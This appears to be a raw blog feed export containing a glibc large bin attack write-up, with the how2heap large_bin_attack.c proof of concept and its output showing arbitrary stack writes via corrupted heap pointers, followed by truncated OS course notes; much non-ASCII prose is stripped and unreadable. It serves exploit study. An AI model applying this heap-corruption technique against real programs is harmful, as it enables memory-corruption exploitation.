victim-&gt;bk_nextsize = victim;<span class="comment">//fwd != bck)fd_nextsizebk_nextsize</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><h2 id="2-31"><a href="#2-31" class="headerlink" title="2.31"></a>2.31</h2><p><a href="https://gdufs-king.github.io/2020/05/09/Glibc2.31%E4%B8%8B%E7%9A%84check%E6%9C%BA%E5%88%B6%E5%92%8C%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/">https://gdufs-king.github.io/2020/05/09/Glibc2.31%E4%B8%8B%E7%9A%84check%E6%9C%BA%E5%88%B6%E5%92%8C%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/</a></p><p>checkchunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim_index = largebin_index (size);</span><br><span class="line">bck = bin_at (av, victim_index);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line"><span class="keyword">if</span> (fwd != bck)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">    size |= PREV_INUSE;</span><br><span class="line">    <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">    assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">        &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">    &#123;<span class="comment">//victimchunk(fwd-&gt;fd)</span></span><br><span class="line">        fwd = bck;</span><br><span class="line">        bck = bck-&gt;bk;</span><br><span class="line">        victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<span class="comment">//fwd-&gt;fd-&gt;bk_nextsize</span></span><br><span class="line">        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">        <span class="comment">//fd_nextsize</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        assert (chunk_main_arena (fwd));</span><br><span class="line">        <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">        &#123;</span><br><span class="line">            fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">            assert (chunk_main_arena (fwd));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size</span><br><span class="line">            == (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (fwd))</span><br><span class="line">            <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">            fwd = fwd-&gt;fd;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123; &#123;<span class="comment">//chunkchunk</span></span><br><span class="line">            victim-&gt;fd_nextsize = fwd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))<span class="comment">//check</span></span><br><span class="line">                <span class="comment">//fwd-&gt;bk_nextsize,fwd-&gt;bk_nextsize-&gt;fd_nextsizefwd</span></span><br><span class="line">                malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">            fwd-&gt;bk_nextsize = victim;</span><br><span class="line">            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">        &#125;</span><br><span class="line">         bck = fwd-&gt;bk;</span><br><span class="line">         <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">             malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><h2 id="How2heap-large-bin-attack"><a href="#How2heap-large-bin-attack" class="headerlink" title="How2heap large_bin_attack"></a>How2heap large_bin_attack</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    This technique is taken from</span></span><br><span class="line"><span class="comment">    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [...]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">              else</span></span><br><span class="line"><span class="comment">              &#123;</span></span><br><span class="line"><span class="comment">                  victim-&gt;fd_nextsize = fwd;</span></span><br><span class="line"><span class="comment">                  victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">                  fwd-&gt;bk_nextsize = victim;</span></span><br><span class="line"><span class="comment">                  victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">              &#125;</span></span><br><span class="line"><span class="comment">              bck = fwd-&gt;bk;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [...]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    mark_bin (av, victim_index);</span></span><br><span class="line"><span class="comment">    victim-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">    victim-&gt;fd = fwd;</span></span><br><span class="line"><span class="comment">    fwd-&gt;bk = victim;</span></span><br><span class="line"><span class="comment">    bck-&gt;fd = victim;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    For more details on how large-bins are handled and sorted by ptmalloc,</span></span><br><span class="line"><span class="comment">    please check the Background section in the aforementioned link.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [...]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// gcc large_bin_attack.c -o large_bin_attack -g</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">                    <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x320</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">                    <span class="string">&quot; the first large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">                    <span class="string">&quot; the second large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">                    <span class="string">&quot; the third large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">                    <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>,</span><br><span class="line">            (<span class="type">void</span> *)(p2 - <span class="number">2</span>), (<span class="type">void</span> *)(p2[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* p4 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span></span><br><span class="line">                    <span class="string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span></span><br><span class="line">                    <span class="string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span></span><br><span class="line">                    <span class="string">&quot; [ %p ]\n\n&quot;</span>,</span><br><span class="line">            (<span class="type">void</span> *)((<span class="type">char</span> *)p1 + <span class="number">0x90</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">                    <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>,</span><br><span class="line">            (<span class="type">void</span> *)(p3 - <span class="number">2</span>), (<span class="type">void</span> *)(p3[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span></span><br><span class="line">                    <span class="string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span></span><br><span class="line">                    <span class="string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span></span><br><span class="line">                    <span class="string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span></span><br><span class="line">                    <span class="string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="type">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="type">void</span> *)stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 ~/D/ctext&gt; ./large_bin_attack</span><br><span class="line">This file demonstrates large bin attack by writing a large <span class="type">unsigned</span> <span class="type">long</span> value into <span class="built_in">stack</span></span><br><span class="line">In practice, large bin attack is generally prepared <span class="keyword">for</span> further attacks, such as rewriting the global variable global_max_fast in libc <span class="keyword">for</span> further fastbin attack</span><br><span class="line"></span><br><span class="line">Let<span class="number">&#x27;</span>s first look at the targets we want to rewrite on <span class="built_in">stack</span>:</span><br><span class="line">stack_var1 (<span class="number">0x7fffffffdca8</span>): <span class="number">0</span></span><br><span class="line">stack_var2 (<span class="number">0x7fffffffdcb0</span>): <span class="number">0</span></span><br><span class="line"></span><br><span class="line">Now, we allocate the first large chunk on the heap at: <span class="number">0x603000</span></span><br><span class="line">And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the first large chunk during the <span class="title function_">free</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">Then, we allocate the second large chunk on the heap at: 0x603360</span><br><span class="line">And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the second large chunk during the <span class="title function_">free</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">Finally, we allocate the third large chunk on the heap at: 0x6037a0</span><br><span class="line">And allocate another fastbin chunk in order to avoid consolidating the top chunk with the third large chunk during the <span class="title function_">free</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">We <span class="built_in">free</span> the first and second large chunks now and they will be inserted in the unsorted bin: [ 0x603360 &lt;--&gt; 0x603000 ]</span><br><span class="line"></span><br><span class="line">Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the freed second large chunk into the large bin freelist, use parts of the freed first large chunk <span class="keyword">for</span> allocation, and reinsert the remaining of the freed first large chunk into the unsorted bin: [ 0x6030a0 ]</span><br><span class="line"></span><br><span class="line">Now, we <span class="built_in">free</span> the third large chunk and it will be inserted in the unsorted bin: [ 0x6037a0 &lt;--&gt; 0x6030a0 ]</span><br><span class="line"></span><br><span class="line">Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s &quot;size&quot; as well as its &quot;bk&quot; and &quot;bk_nextsize&quot; pointers</span><br><span class="line">Basically, we decrease the size of the freed second large chunk to force <span class="built_in">malloc</span> to insert the freed third large chunk at the head of the large bin freelist. To overwrite the <span class="built_in">stack</span> variables, we <span class="built_in">set</span> &quot;bk&quot; to 16 bytes before stack_var1 and &quot;bk_nextsize&quot; to 32 bytes before stack_var2</span><br><span class="line"></span><br><span class="line">Let&#x27;s <span class="built_in">malloc</span> again, so the freed third large chunk being inserted into the large bin freelist. During this time, targets should have already been rewritten:</span><br><span class="line"><span class="title function_">stack_var1</span> <span class="params">(<span class="number">0x7fffffffdca8</span>)</span>: 0x6037a0</span><br><span class="line"><span class="title function_">stack_var2</span> <span class="params">(<span class="number">0x7fffffffdcb0</span>)</span>: 0x6037a0</span><br></pre></td></tr></table></figure><h3 id="chunkchunktopchunkchunk"><a href="#chunkchunktopchunkchunk" class="headerlink" title="chunkchunktopchunkchunk"></a>chunkchunktopchunkchunk</h3><p><img src="/2023/03/24/Large-bin-attack/image-20230323235004320.png" alt="image-20230323235004320"></p><h3 id="void-p4-x3D-malloc-0x90"><a href="#void-p4-x3D-malloc-0x90" class="headerlink" title="void* p4 &#x3D; malloc(0x90);"></a>void* p4 &#x3D; malloc(0x90);</h3><p>binchunk</p><ul><li>unsorted binp1small bin</li><li>unsorted binp2large bin</li><li>smallbinchunk p1p4unsortedbin</li></ul><p><img src="/2023/03/24/Large-bin-attack/image-20230323235716579.png" alt="image-20230323235716579"></p><h3 id="free-p3"><a href="#free-p3" class="headerlink" title="free(p3)"></a>free(p3)</h3><p>unsortedbin</p><p><img src="/2023/03/24/Large-bin-attack/image-20230324000149331.png" alt="image-20230324000149331"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p></p><p><img src="/2023/03/24/Large-bin-attack/image-20230324000347943.png" alt="image-20230324000347943"></p><p>p2-&gt;size&#x3D;0x3f1</p><p>p2-&gt;bk&#x3D;stack_var1_addr - 0x10</p><p>p2-&gt;bk_nextsize&#x3D;stack_var2_addr - 0x20</p><h3 id="malloc-0x90"><a href="#malloc-0x90" class="headerlink" title="!!malloc(0x90);!!"></a>!!malloc(0x90);!!</h3><p></p><ul><li>unsorted binp1small bin</li><li>unsorted binp3large bin</li><li>smallbinp1mallocunsortedbin</li></ul><p>unsorted binp3large bin</p><p>p2-&gt;size&#x3D;0x3f1<code> while ((unsigned long) size &lt; fwd-&gt;size)</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;fd_nextsize = fwd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;bk_nextsize = victim;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure><p><strong>victimp3fwdp2</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">P3-&gt;fd_nextsize = P2</span><br><span class="line"></span><br><span class="line">P3-&gt;bk_nextsize = P2-&gt;bk_nextsize=stack_var2_addr - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">P2-&gt;bk_nextsize =P3</span><br><span class="line"></span><br><span class="line">P3-&gt;bk_nextsize-&gt;fd_nextsize = *stack_var2_addr<span class="number">-0x20</span>+<span class="number">0x20</span>)= *stack_var2_addr=P3</span><br></pre></td></tr></table></figure><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bck = fwd-&gt;bk;</span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bck=p2-&gt;bk</span><br><span class="line"></span><br><span class="line">p3-&gt;bk=p2-&gt;bk</span><br><span class="line"></span><br><span class="line">p3-&gt;fd=p2</span><br><span class="line"></span><br><span class="line">p2-&gt;bk=p3</span><br><span class="line"></span><br><span class="line">p2-&gt;bk-&gt;fd=*(stack_var1_addr - <span class="number">0x10</span>+<span class="number">0x10</span>)=*(stack_var1_addr=P3</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>largebinbkbk_nextsizetar1-0x10,tar2-0x20mallocunsortedbinchunk(chunklargebinchunk)largebintar1tar2chunk</p>]]></content>
      
      
      
        <tags>
            
            <tag> Large Bin Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NJUOS:</title>
      <link href="/2023/03/23/NJUOS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E7%9A%84%E7%A8%8B%E5%BA%8F/"/>
      <url>/2023/03/23/NJUOS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E7%9A%84%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<p><a href="http://jyywiki.cn/OS/2022/slides/2.slides#/">http://jyywiki.cn/OS/2022/slides/2.slides#/</a></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p></p><p><em>X</em>&#x3D;<em>X</em><em>Y</em></p><p><em>Y</em>&#x3D;<em>X</em><em>Y</em></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REGS_FOREACH(_)  _(X) _(Y)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RUN_LOGIC        X1 = !X &amp;&amp; Y; \    <span class="comment">//</span></span></span><br><span class="line">                         Y1 = !X &amp;&amp; !Y;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFINE(X)        static int X, X##1; <span class="comment">//##</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UPDATE(X)        X = X##1;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINT(X)         printf(#X <span class="string">&quot; = %d; &quot;</span>, X); <span class="comment">//#</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  REGS_FOREACH(DEFINE)</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123; <span class="comment">// clock</span></span><br><span class="line">    RUN_LOGIC</span><br><span class="line">    <span class="title function_">REGS_FOREACH</span><span class="params">(PRINT)</span></span><br><span class="line">    <span class="title function_">REGS_FOREACH</span><span class="params">(UPDATE)</span></span><br><span class="line">    <span class="title function_">putchar</span><span class="params">(<span class="string">&#x27;\n&#x27;</span>)</span>; sleep(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;   </span><br><span class="line">gcc -E </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">static</span> <span class="type">int</span> X, X1; <span class="type">static</span> <span class="type">int</span> Y, Y1;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    X1 = !X &amp;&amp; Y; Y1 = !X &amp;&amp; !Y;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;X&quot;</span> <span class="string">&quot; = %d; &quot;</span>, X); <span class="built_in">printf</span>(<span class="string">&quot;Y&quot;</span> <span class="string">&quot; = %d; &quot;</span>, Y);</span><br><span class="line">    X = X1; Y = Y1;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>); sleep(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">grxer@grxer ~/D/s/N/p2&gt; ./simulator </span><br><span class="line">X = <span class="number">0</span>; Y = <span class="number">0</span>; </span><br><span class="line">X = <span class="number">0</span>; Y = <span class="number">1</span>; </span><br><span class="line">X = <span class="number">1</span>; Y = <span class="number">0</span>; </span><br><span class="line">X = <span class="number">0</span>; Y = <span class="number">0</span>; </span><br><span class="line">X = <span class="number">0</span>; Y = <span class="number">1</span>; </span><br><span class="line">X = <span class="number">1</span>; Y = <span class="number">0</span>; </span><br></pre></td></tr></table></figure><p></p><blockquote><ul><li><strong></strong></li><li><code>#</code></li><li><code>##</code><code>##</code></li></ul></blockquote><p><strong>X-MACRO</strong>,</p><blockquote><p>x-macro</p><p><strong>X</strong></p><ul><li>X-Macros </li><li></li><li></li></ul><p><strong>X</strong></p><ul><li></li><li></li><li> OS </li></ul></blockquote><h2 id="tldr"><a href="#tldr" class="headerlink" title="tldr"></a>tldr</h2><p>Too Long Didnt Read</p><p>man</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p></p><ul><li> &#x3D;  + </li><li> &#x3D; <code>main</code> </li><li> &#x3D; </li></ul><p>n-1n-1n-1</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">hanoi</span><span class="params">(<span class="type">int</span> n, <span class="type">char</span> from, <span class="type">char</span> to, <span class="type">char</span> via)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">&quot;%c -&gt; %c\n&quot;</span>, from, to);</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    hanoi(n - <span class="number">1</span>, from, via, to);</span><br><span class="line">    hanoi(<span class="number">1</span>,     from, to,  via);</span><br><span class="line">    hanoi(n - <span class="number">1</span>, via,  to,  from);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cc</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> pc, n;</span><br><span class="line">  <span class="type">char</span> from, to, via;</span><br><span class="line">&#125; Frame;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> call(...) (&#123; *(++top) = (Frame) &#123; .pc = 0, __VA_ARGS__ &#125;; &#125;)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ret()     (&#123; top--; &#125;)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> goto(loc) (&#123; f-&gt;pc = (loc) - 1; &#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hanoi</span><span class="params">(<span class="type">int</span> n, <span class="type">char</span> from, <span class="type">char</span> to, <span class="type">char</span> via)</span> &#123;</span><br><span class="line">  Frame stk[<span class="number">64</span>], *top = stk - <span class="number">1</span>;</span><br><span class="line">  call(n, from, to, via);</span><br><span class="line">  <span class="keyword">for</span> (Frame *f; (f = top) &gt;= stk; f-&gt;pc++) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (f-&gt;pc) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>: <span class="keyword">if</span> (f-&gt;n == <span class="number">1</span>) &#123; <span class="built_in">printf</span>(<span class="string">&quot;%c -&gt; %c\n&quot;</span>, f-&gt;from, f-&gt;to); <span class="keyword">goto</span>(<span class="number">4</span>); &#125; <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>: call(f-&gt;n - <span class="number">1</span>, f-&gt;from, f-&gt;via, f-&gt;to);   <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>: call(       <span class="number">1</span>, f-&gt;from, f-&gt;to,  f-&gt;via);  <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>: call(f-&gt;n - <span class="number">1</span>, f-&gt;via,  f-&gt;to,  f-&gt;from); <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>: ret();                                    <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>: assert(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p></p><ul><li> &#x3D;  M +  R</li><li> &#x3D; ld&#x3D;ld-linux-x86-64.solibc</li><li> &#x3D; </li></ul><p></p><p>syscall</p><p> &#x3D;  + syscall</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line"></span><br><span class="line">.globl _start</span><br><span class="line">_start:</span><br><span class="line">  movq $SYS_write, %rax   // write(</span><br><span class="line">  movq $1,         %rdi   //   fd=1,</span><br><span class="line">  movq $st,        %rsi   //   